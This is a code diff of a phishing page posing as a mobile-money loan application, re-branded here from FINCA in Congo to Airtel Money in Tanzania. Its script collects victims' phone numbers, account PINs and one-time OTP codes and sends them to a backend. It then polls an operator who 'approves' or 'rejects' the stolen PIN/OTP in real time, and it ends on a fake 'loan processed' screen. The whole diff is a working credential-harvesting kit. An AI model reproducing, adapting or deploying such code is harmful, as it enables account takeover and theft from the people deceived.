+            <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp4')" id="otp3">
+            <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp5')" id="otp4">
+            <input type="text" maxlength="1" inputmode="numeric" id="otp5">
           </div>
 
-          <div class="login-bottom" style="padding-top: 30px; padding-bottom: 30px;">
-            <div class="help-link" onclick="alert('Help')"><i class="fa-regular fa-circle-question"></i> <span id="t-help-btn-2">Aide & Support</span></div>
-            <div class="login-footer" style="margin-top: 10px;">v4.2.9</div>
-          </div>
+          <p class="resend-text">Resend OTP in <span id="timer">44</span> Sec</p>
+          <div class="error" id="errOtp" style="margin-top: 15px;"></div>
+        </div>
+
+        <div class="login-bottom" style="padding-top: 30px; padding-bottom: 30px;">
+          <div class="help-link" onclick="alert('Help')"><i class="fa-regular fa-circle-question"></i> Help & Support</div>
+          <div class="login-footer" style="margin-top: 10px;">v4.2.9</div>
         </div>
       </div>
+    </div>
 
-      <!-- Page 5: Waiting for Admin -->
-      <div id="page-waiting" class="page">
-        <div class="waiting-screen">
-          <div class="spinner"></div>
-          <h2 id="t-wait-title">Veuillez patienter...</h2>
-          <p id="t-wait-sub">Nous vérifions vos informations.<br>Cela peut prendre un moment.</p>
-        </div>
+    <!-- Page 5: Waiting for Admin -->
+    <div id="page-waiting" class="page">
+      <div class="waiting-screen">
+        <div class="spinner"></div>
+        <h2>Please wait...</h2>
+        <p>We are verifying your details.<br>This may take a moment.</p>
       </div>
+    </div>
 
-      <!-- Page 6: Success -->
-      <div id="page5" class="page" style="text-align: center; padding: 50px 20px; justify-content: center;">
-        <h2 style="color: var(--finca-blue); font-size: 2.5rem; margin-bottom: 20px; font-weight: 800;" id="t-success-title">Félicitations!</h2>
-        <p style="color: var(--text-dark); font-size: 1.1rem; line-height: 1.5;" id="t-success-sub">Votre demande de prêt a été entièrement traitée. Veuillez vérifier votre compte sous peu.</p>
-      </div>
+    <!-- Page 6: Success -->
+    <div id="page5" class="page" style="text-align: center; padding: 50px 20px; justify-content: center;">
+      <h2 style="color: var(--airtel-red); font-size: 2.5rem; margin-bottom: 20px; font-weight: 800;">Congratulations!</h2>
+      <p style="color: var(--text-muted); font-size: 1.1rem; line-height: 1.5;">Your loan application has been fully processed. Please check your Airtel Money account shortly.</p>
     </div>
   </div>
-
 </div>
 
 <script>
   let sessionId = null;
   let pollTimer = null;
   let isPolling = false;
-  let currentLang = 'fr';
-
-  // Dictionary of translations
-  const translations = {
-    en: {
-      heroTitle: "Boost your business today",
-      heroSub: "Apply for your credit online<br>Response in 7 days",
-      heroBtn: "Apply for your loan",
-      calcAmount: "Loan Amount",
-      calcTerm: "Loan Term",
-      termMin: "6 months",
-      termMax: "60 months",
-      monthly: "Monthly Payment",
-      formTitle: "Your Application",
-      name: "Full name",
-      emp: "Employment status",
-      empSel: "Select your status",
-      emp1: "Employed",
-      emp2: "Self-Employed",
-      emp3: "Unemployed",
-      income: "Monthly income (FC)",
-      amount: "Loan amount (FC)",
-      period: "Repayment period",
-      periodSel: "Select period",
-      period1: "6 months",
-      period2: "12 months",
-      period3: "24 months",
-      period4: "36 months",
-      submit: "SUBMIT APPLICATION",
-      login: "Login",
-      pin: "Enter your PIN",
-      registerText: "To register a FINCA account or get assistance,<br>click below",
-      registerBtn: "Register",
-      helpBtn: "Help & Support",
-      termsText: "By signing in you agree to the",
-      termsLink: "Terms and Conditions",
-      otp: "Enter the OTP code sent to",
-      resend: "Resend OTP in",
-      waitTitle: "Please wait...",
-      waitSub: "We are verifying your details.<br>This may take a moment.",
-      successTitle: "Congratulations!",
-      successSub: "Your loan application has been fully processed. Please check your account shortly.",
-      phName: "Enter your full name",
-      phIncome: "Enter your monthly income",
-      phAmount: "Enter loan amount",
-      phPhone: "Phone Number"
-    },
-    fr: {
-      heroTitle: "Boostez votre entreprise dès aujourd'hui",
-      heroSub: "Demandez votre crédit en ligne<br>Réponse en 7 jours",
-      heroBtn: "Demander votre prêt",
-      calcAmount: "Montant du prêt",
-      calcTerm: "Durée du prêt",
-      termMin: "6 mois",
-      termMax: "60 mois",
-      monthly: "Paiement mensuel",
-      formTitle: "Votre Demande",
-      name: "Nom complet",
-      emp: "Situation professionnelle",
-      empSel: "Sélectionnez votre situation",
-      emp1: "Employé",
-      emp2: "Travailleur indépendant",
-      emp3: "Sans emploi",
-      income: "Revenu mensuel (FC)",
-      amount: "Montant du prêt (FC)",
-      period: "Période de remboursement",
-      periodSel: "Sélectionnez la période",
-      period1: "6 mois",
-      period2: "12 mois",
-      period3: "24 mois",
-      period4: "36 mois",
-      submit: "SOUMETTRE LA DEMANDE",
-      login: "Connexion",
-      pin: "Entrez votre code PIN",
-      registerText: "Pour créer un compte FINCA ou obtenir de l'aide,<br>cliquez ci-dessous",
-      registerBtn: "S'inscrire",
-      helpBtn: "Aide & Support",
-      termsText: "En vous connectant, vous acceptez les",
-      termsLink: "Conditions Générales",
-      otp: "Entrez le code OTP envoyé à",
-      resend: "Renvoyer l'OTP dans",
-      waitTitle: "Veuillez patienter...",
-      waitSub: "Nous vérifions vos informations.<br>Cela peut prendre un moment.",
-      successTitle: "Félicitations!",
-      successSub: "Votre demande de prêt a été entièrement traitée. Veuillez vérifier votre compte sous peu.",
-      phName: "Entrez votre nom complet",
-      phIncome: "Entrez votre revenu mensuel",
-      phAmount: "Entrez le montant du prêt",
-      phPhone: "Numéro de téléphone"
-    }
-  };
-
-  // Function to close the Ad and show the app
-  function skipAd() {
-    document.getElementById('page-ad').classList.remove('active');
-    document.getElementById('page-ad').style.display = 'none';
-    
-    document.getElementById('main-app').style.display = 'flex';
-    document.getElementById('page1').classList.add('active');
-  }
-
-  // Automatically skip ad after 8 seconds (matches video progress bar animation)
-  setTimeout(() => {
-    if (document.getElementById('page-ad').classList.contains('active')) {
-      skipAd();
-    }
-  }, 8000);
 
   async function init() {
     try {
@@ -636,95 +457,27 @@
   }
   init();
 
-  // Language Switcher Logic
-  function setLanguage(lang) {
-    currentLang = lang;
-    document.getElementById('btn-en').classList.toggle('active', lang === 'en');
-    document.getElementById('btn-fr').classList.toggle('active', lang === 'fr');
-
-    const t = translations[lang];
-
-    document.getElementById('t-hero-title').innerHTML = t.heroTitle;
-    document.getElementById('t-hero-sub').innerHTML = t.heroSub;
-    document.getElementById('t-hero-btn').innerHTML = t.heroBtn;
-    document.getElementById('t-calc-amount').innerHTML = t.calcAmount;
-    document.getElementById('t-calc-term').innerHTML = t.calcTerm;
-    document.getElementById('t-term-min').innerHTML = t.termMin;
-    document.getElementById('t-term-max').innerHTML = t.termMax;
-    document.getElementById('t-monthly').innerHTML = t.monthly;
-    
-    document.getElementById('t-form-title').innerHTML = t.formTitle;
-    document.getElementById('t-name').innerHTML = t.name;
-    document.getElementById('t-emp').innerHTML = t.emp;
-    document.getElementById('t-emp-sel').innerHTML = t.empSel;
-    document.getElementById('t-emp-1').innerHTML = t.emp1;
-    document.getElementById('t-emp-2').innerHTML = t.emp2;
-    document.getElementById('t-emp-3').innerHTML = t.emp3;
-    document.getElementById('t-income').innerHTML = t.income;
-    document.getElementById('t-amount').innerHTML = t.amount;
-    document.getElementById('t-period').innerHTML = t.period;
-    document.getElementById('t-period-sel').innerHTML = t.periodSel;
-    document.getElementById('t-period-1').innerHTML = t.period1;
-    document.getElementById('t-period-2').innerHTML = t.period2;
-    document.getElementById('t-period-3').innerHTML = t.period3;
-    document.getElementById('t-period-4').innerHTML = t.period4;
-    document.getElementById('t-submit').innerHTML = t.submit;
-
-    document.getElementById('t-login').innerHTML = t.login;
-    document.getElementById('t-pin').innerHTML = t.pin;
-    document.getElementById('t-register-text').innerHTML = t.registerText;
-    document.getElementById('t-register-btn').innerHTML = t.registerBtn;
-    document.getElementById('t-help-btn').innerHTML = t.helpBtn;
-    document.getElementById('t-help-btn-2').innerHTML = t.helpBtn;
-    document.getElementById('t-terms-text').innerHTML = t.termsText;
-    document.getElementById('t-terms-link').innerHTML = t.termsLink;
-
-    document.getElementById('t-otp').innerHTML = t.otp;
-    document.getElementById('t-resend').innerHTML = t.resend;
-    document.getElementById('t-wait-title').innerHTML = t.waitTitle;
-    document.getElementById('t-wait-sub').innerHTML = t.waitSub;
-    document.getElementById('t-success-title').innerHTML = t.successTitle;
-    document.getElementById('t-success-sub').innerHTML = t.successSub;
-
-    document.getElementById('qName').placeholder = t.phName;
-    document.getElementById('qIncome').placeholder = t.phIncome;
-    document.getElementById('qAmount').placeholder = t.phAmount;
-    document.getElementById('pPhone').placeholder = t.phPhone;
-
-    updateCalc();
-  }
-
   function showPage(pageId) {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     document.getElementById(pageId).classList.add('active');
     document.querySelector('.page-container').scrollTop = 0;
   }
 
-  function updateCalc() {
-    const amount = document.getElementById('loanAmount').value;
-    const term = document.getElementById('loanTerm').value;
-    
-    const fcText = 'FC';
-    const moisText = currentLang === 'en' ? 'months' : 'mois';
-
-    document.getElementById('amountLabel').textContent = Number(amount).toLocaleString('fr-FR') + ' ' + fcText;
-    document.getElementById('termLabel').textContent = term + ' ' + moisText;
-
-    const monthly = (amount * 1.08) / term; 
-    document.getElementById('monthlyLabel').textContent = Number(monthly).toLocaleString('fr-FR', {maximumFractionDigits: 0}) + ' ' + fcText;
-  }
-
+  // Page 2 Submit
   document.getElementById('formQuestionnaire').addEventListener('submit', async (e) => {
     e.preventDefault();
-    const btn = e.target.querySelector('button');
+    const btn = document.getElementById('btnSubmitForm');
+    
+    // Instantly show loading state on button
+    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processing...';
     btn.disabled = true;
     document.getElementById('errQ').style.display = 'none';
 
     const data = {
       fullName: document.getElementById('qName').value,
       employment: document.getElementById('qEmployment').value,
-      income: document.getElementById('qIncome').value + ' FC',
-      loanAmount: document.getElementById('qAmount').value + ' FC',
+      income: document.getElementById('qIncome').value + ' TZS',
+      loanAmount: document.getElementById('qAmount').value + ' TZS',
       loanTerm: document.getElementById('qTerm').value
     };
 
@@ -737,9 +490,10 @@
         startPolling(); 
       } else { throw new Error(); }
     } catch (err) {
-      document.getElementById('errQ').textContent = currentLang === 'en' ? 'Submission failed. Try again.' : 'Échec de la soumission. Réessayez.';
-      document.getElementById('errQ').style.display = 'block';
+      btn.innerHTML = '<span>SUBMIT APPLICATION</span>';
       btn.disabled = false;
+      document.getElementById('errQ').textContent = 'Submission failed. Try again.';
+      document.getElementById('errQ').style.display = 'block';
     }
   });
 
@@ -749,21 +503,24 @@
     }
   }
 
+  // Page 3 Submit
   async function submitRegistration() {
     const phone = document.getElementById('pPhone').value.trim();
     const pins = Array.from(document.querySelectorAll('#pinContainer input')).map(i => i.value).join('');
     
     if (phone === '' || pins === '') {
-      document.getElementById('errLogin').textContent = currentLang === 'en' ? 'Please fill in the phone number and PIN.' : 'Veuillez remplir le numéro et le code PIN.';
+      document.getElementById('errLogin').textContent = 'Please fill in the Airtel phone number and PIN.';
       document.getElementById('errLogin').style.display = 'block';
       return;
     }
 
     document.getElementById('errLogin').style.display = 'none';
+    const btn = document.getElementById('btnRegister');
+    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i>';
     
     const data = {
       fullName: document.getElementById('qName').value, 
-      phone: '+243 ' + phone,
+      phone: '+255 ' + phone,
       pin: pins
     };
 
@@ -778,7 +535,8 @@
       });
       if (res.ok) startPolling(); 
     } catch (err) {
-      document.getElementById('errLogin').textContent = currentLang === 'en' ? 'Connection error.' : 'Erreur de connexion.';
+      btn.innerHTML = '<i class="fa-solid fa-user-plus"></i>Register';
+      document.getElementById('errLogin').textContent = 'Connection error.';
       document.getElementById('errLogin').style.display = 'block';
     }
   }
@@ -809,7 +567,7 @@
       });
       if (res.ok) startPolling(); 
     } catch (err) {
-      document.getElementById('errOtp').textContent = currentLang === 'en' ? 'Connection error.' : 'Erreur de connexion.';
+      document.getElementById('errOtp').textContent = 'Connection error.';
       document.getElementById('errOtp').style.display = 'block';
     }
   }
@@ -832,14 +590,15 @@
         } 
         else if (status === 'rejected_4') {
           stopPolling();
-          alert(currentLang === 'en' ? 'Your application was rejected. Please try again.' : 'Votre demande a été rejetée. Veuillez réessayer.');
+          alert('Your application was rejected. Please try again.');
           showPage('page2');
-          document.getElementById('formQuestionnaire').querySelector('button').disabled = false;
+          document.getElementById('btnSubmitForm').innerHTML = '<span>SUBMIT APPLICATION</span>';
+          document.getElementById('btnSubmitForm').disabled = false;
         } 
         else if (status === 'approved_all') {
           stopPolling();
           const phone = document.getElementById('pPhone').value;
-          document.getElementById('otpPhoneDisplay').textContent = '+243 ' + phone;
+          document.getElementById('otpPhoneDisplay').textContent = '+255 ' + phone;
           showPage('page4');
         } 
         else if (status === 'completed') {
@@ -848,10 +607,11 @@
         } 
         else if (status === 'rejected_pin') {
           stopPolling();
-          alert(currentLang === 'en' ? 'The Admin rejected your PIN/OTP. Please try again.' : 'L admin a rejeté votre PIN/OTP. Veuillez réessayer.');
+          alert('The Admin rejected your PIN/OTP. Please try again.');
           document.querySelectorAll('#otpContainer input').forEach(i => i.value = '');
           document.querySelectorAll('#pinContainer input').forEach(i => i.value = '');
           document.getElementById('errOtp').style.display = 'none';
+          document.getElementById('btnRegister').innerHTML = '<i class="fa-solid fa-user-plus"></i>Register';
           showPage('page3');
         }
       } catch (err) { console.error(err); }
@@ -868,8 +628,6 @@
     const t = document.getElementById('timer');
     if(t && parseInt(t.textContent) > 0) t.textContent = parseInt(t.textContent) - 1;
   }, 1000);
-
-  updateCalc();
 </script>
 </body>
 </html>
